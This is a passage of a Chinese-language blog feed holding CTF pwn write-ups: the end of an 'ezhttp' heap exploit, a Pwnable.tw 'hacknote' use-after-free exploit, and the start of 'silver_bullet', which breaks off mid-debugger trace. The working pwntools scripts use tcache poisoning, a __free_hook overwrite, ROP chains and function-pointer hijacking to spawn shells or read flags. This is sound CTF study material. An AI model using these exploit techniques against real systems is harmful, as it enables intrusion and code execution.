class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /create Cookie: user[^=admin token: \r\r\n\r\ncontent=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /del Cookie: user[^=admin token: \r\r\n\r\nindex=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========\n&quot;</span>)</span><br><span class="line">p.send((<span class="string">&#x27;POST /edit Cookie: user[^=admin  token: \r\r\n\r\nindex=&#123;0&#125;&amp;content=&#123;1&#125;&amp;&#x27;</span>).<span class="built_in">format</span>(idx,content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /create Cookie: user[^=admin token: \r\r\n\r\ncontent=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele2</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">    p.send((<span class="string">&#x27;POST /del Cookie: user[^=admin token: \r\r\n\r\nindex=&#123;&#125; &#x27;</span>).<span class="built_in">format</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">idx,content</span>):</span><br><span class="line"><span class="comment"># sleep(0.5)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;======= Send Http packet to me: ========&quot;</span>)</span><br><span class="line">p.send((<span class="string">&#x27;POST /edit Cookie: user[^=admin  token: \r\r\n\r\nindex=&#123;0&#125;&amp;content=&#123;1&#125;&amp;&#x27;</span>).<span class="built_in">format</span>(idx,content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">55504</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=process([<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&quot;</span>,<span class="string">&quot;./ezhttp&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;/home/an9ela/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># p=process(&quot;./ezhttp&quot;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your gift: &quot;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># dele(1)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># debug(0x0000000000019E3)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap-<span class="number">0x250</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;\xff&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">0x1</span>)*<span class="number">0x40</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(heap+<span class="number">0xa0</span>+<span class="number">0x20</span>)[:<span class="number">6</span>]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">stdout=<span class="built_in">int</span>(raw_input(<span class="string">&#x27;input: &#x27;</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">8</span>,p16(stdout)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># add(&#x27;a&#x27;*0x40)</span></span><br><span class="line"><span class="comment"># debug(0x0001A78)</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>+p32(<span class="number">0xfbad1801</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> +<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;a&#x27;*0x1f)</span></span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ec761</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">edit2(<span class="number">11</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> +p8(<span class="number">0xc8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">dele2(<span class="number">0</span>)</span><br><span class="line">edit2(<span class="number">2</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x38</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add2(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add2(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(libc.address+<span class="number">0x52145</span>)[:<span class="number">6</span>])</span><br><span class="line">edit2(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heap -= <span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">p_rdi = <span class="number">0x2155f</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x130889</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x43a78</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0xd29d5</span>+libc.address</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;./flag&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">12</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x320</span>+<span class="number">0xa0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap+<span class="number">0x320</span>+<span class="number">0xa8</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(p_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">edit2(<span class="number">8</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele2(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdi,heap+<span class="number">0x320</span>,p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,p_rax,<span class="number">2</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">4</span>,p_rdx_rsi,<span class="number">0x100</span>,heap+<span class="number">0x2000</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">1</span>,p_rax,<span class="number">1</span>,syscall_ret</span><br><span class="line">]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x28</span>+flat(rop_chain))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">    <span class="comment"># libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>libc使用的时glibc all in one里面的，download时候也一起把dbg符号一起下载了，之后编译一下就能用了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw hacknote</title>
      <link href="/2020/10/17/Pwnable_hacknote/"/>
      <url>/2020/10/17/Pwnable_hacknote/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-hacknote"><a href="#Pwnable-tw-hacknote" class="headerlink" title="Pwnable.tw  hacknote"></a>Pwnable.tw  hacknote</h3><blockquote><p>简单菜单题，提供了一种利用思路</p></blockquote><span id="more"></span><p>程序的独特之处在于在malloc新堆之前会先malloc(8)（我就称它为lead）过来存放puts的函数指针和解下来malloc得到的ptr</p><p>show()函数则是通过调用该位置的函数指针来进行打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">v1 = atoi(&amp;buf);</span><br><span class="line"><span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= numbers )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  (*ptr[v1])(ptr[v1]);</span><br></pre></td></tr></table></figure><p>显而易见，只要修改存在与堆上的函数指针为system，再show即可完成利用。<br>程序还存在UAF，对我们来说是个好消息。</p><p>先利用堆分配得到chunk0对应的lead，改heap_ptr为printf_got，show(0)得到libc地址，然后同样方法得到lead，改puts的函数指针为system,heap_ptr为”||sh”,’||’用来于完成参数的截断，之后show拿到shell🚩</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">r=process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10102</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Note size :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">r.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">        r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862B</span>)+p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_address=u32(r.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system=libc_address+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh=libc_address+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(system)+<span class="string">&#x27;||sh&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure><p>200分的题相对容易点，后面就难起来了🌩</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw silver_bullet</title>
      <link href="/2020/10/17/Pwnable_silver_bullet/"/>
      <url>/2020/10/17/Pwnable_silver_bullet/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-silver-bullet"><a href="#Pwnable-tw-silver-bullet" class="headerlink" title="Pwnable.tw silver_bullet"></a>Pwnable.tw silver_bullet</h3><blockquote><p>好久之前做过一次，当时不怎么会调，栈构造的乱七八糟的，现在再来做感觉还是有点东西的😂</p></blockquote><span id="more"></span><p>这题大概流程就是先create_bullet，再增加power，最后去挑战boss(HP&#x3D;0x7f000000),成功就退出了，啊这</p><p>程序的漏洞点在power_up：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">power_up</span><span class="params">(<span class="type">char</span> *dest)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-34h]</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// [esp+30h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30</span>u);     <span class="comment">//这里的dest是就是我所说的main函数s，而这里的s只是这个函数的局部变量。</span></span><br><span class="line">  <span class="keyword">if</span> ( !*dest )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You need create the bullet first !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)dest + <span class="number">0xC</span>) &gt; <span class="number">47u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t power up any more !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your another description of bullet :&quot;</span>);</span><br><span class="line">  read_input(&amp;s, <span class="number">0x30</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  <span class="built_in">strncat</span>(dest, &amp;s, <span class="number">48</span> - *((_DWORD *)dest + <span class="number">12</span>));</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;s) + *((_DWORD *)dest + <span class="number">12</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your new power is : %u\n&quot;</span>, v3);</span><br><span class="line">  *((_DWORD *)dest + <span class="number">12</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Enjoy it !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strncat函数在执行完拼接后会在末尾加上一个\0，如果我们先创造47个bullet然后再powe_up一个，那在strncat的时候就会在s+0x30的位置写入一个字节的\0，导致之前存放在这里的size数据被覆盖为0，然后再之后的strlen(&amp;s) + *((_DWORD *)dest + 12)计算的结果就是1了。</p><p>从而我们有了继续向下拼接的机会，在之后的拼接会在s+0x30开始我们可以先伪造size大于0x7fffffff，然后就到了ebp的位置，伪造ebp为bss地址，返回地址用puts_plt覆盖，接下来写进去pop_ebx——ret作为puts的返回地址来清理栈并接着ret，之后写puts函数的参数为puts_got，然后写入input_read的地址，使得在pop_ebx_ret时去执行read_inputs，接下来设置read的参数为上面的bss的段和输入的size（够用就行），之后返回地址写成leave_ret使得两次leave把栈迁移到bss去执行我们input_read输入的system。</p><p>拼接的效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">15:0054│ eax    0xffddc584 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">... ↓</span><br><span class="line">20:0080│        0xffddc5b0 ◂— 0x62616161 (&#x27;aaab&#x27;)</span><br><span class="line">21:0084│        0xffddc5b4 ◂— 0xffffff01        --&gt;size</span><br><span class="line">22:0088│        0xffddc5b8 —▸ 0x804b410 ◂— 0x0  --&gt;bss</span><br><span class="line">23:008c│        0xffddc5bc —▸ 0x80484a8 ◂— jmp    dword ptr [0x804afdc]  --&gt;ret_addr</span><br><span class="line">24:0090│        0xffddc5c0 —▸ 0x8048475 (_init+33) ◂— pop    ebx  --&gt;pop_ret</span><br><span class="line">25:0094│        0xffddc5c4 —▸ 0x804afdc (_GLOBAL_OFFSET_TABLE_+24) —▸ 0xf7d88cb0 (puts) ◂— push   ebp</span><br><span class="line">26:0098│ edx-1  0xffddc5c8 —▸ 0x80485eb (read_input) ◂— push   ebp</span><br><span class="line">27:009c│        0xffddc5cc —▸ 0x8048a18 (main+196) ◂— leave</span><br><span class="line">28:00a0│        0xffddc5d0 —▸ 0x804b410 ◂— 0x0</span><br><span class="line">29:00a4│        0xffddc5d4 ◂— 0x1011</span><br></pre></td></tr></table></figure><p>之后执行beats获胜，main函数将执行返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">EAX  0x0</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xf7fa0870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> EDI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> ESI  0xf7f9f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line"> EBP  0x804b410 ◂— 0x0</span><br><span class="line"> ESP  0xffb8d030 —▸ 0x8048475 (_init+33) ◂— pop    ebx</span><br><span class="line"> EIP  0xf7e4bcb0 (puts) ◂— push   ebp</span><br><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line">   0x80489db  &lt;main+135&gt;    mov    eax, 0</span><br><span class="line">   0x80489e0  &lt;main+140&gt;    jmp    main+196 &lt;0x8048a18&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x8048a18  &lt;main+196&gt;    leave</span><br><span class="line">   0x8048a19  &lt;main+197&gt;    ret</span><br><span class="line">    ↓</span><br><span class="line">   0x80484a8                jmp    dword ptr [0x804afdc] &lt;0xf7e4bcb0&gt;</span><br><span class="line">    ↓</span><br><span class="line"> ► 0xf7e4bcb0 &lt;puts&gt;        push   ebp</span><br><span class="line">   0xf7e4bcb1 &lt;puts+1&gt;      mov    ebp, esp</span><br><span class="line">   0xf7e4bcb3 &lt;puts+3&gt;      push   edi</span><br><span class="line">   0xf7e4bcb4 &lt;puts+4&gt;      push   esi</span><br><span class="line">   0xf7e4bcb5 &lt;puts+5&gt;      push   ebx</span><br><span class="line">   0xf7e4bcb6 &lt;puts+6&gt;      call   __x86.get_pc_thunk.bx &lt;0xf7f0bc55&gt;</span><br><span class="line">─────────────────────────────────────────[ STACK ]─────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffb8d030 —▸ 0x8048475 (_init+33) ◂— pop    ebx</span><br><span class="line">01:0004│      0xffb8d034 —▸ 